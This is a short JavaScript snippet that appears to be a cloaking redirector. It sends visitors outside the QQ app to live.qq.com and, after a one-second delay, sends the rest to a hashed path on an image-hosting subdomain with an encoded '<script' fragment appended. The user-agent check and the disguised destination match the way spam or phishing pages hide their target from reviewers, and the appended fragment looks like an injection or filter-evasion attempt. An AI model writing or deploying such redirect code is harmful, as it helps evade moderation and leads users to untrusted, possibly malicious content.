function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://live.qq.com";
    }
}

leleua();

setTimeout(function() {
    var timestamp = new Date().getTime();
    var url = 'https://meeting-75420.picgzc.qpic.cn/a3db69872e35de46b3f8fca262dfbd1a2daea20631cdeaaaf4cd8d28773bc91d' + '?' + timestamp + '%3Cscript';
    location.href = url;
}, 1000);
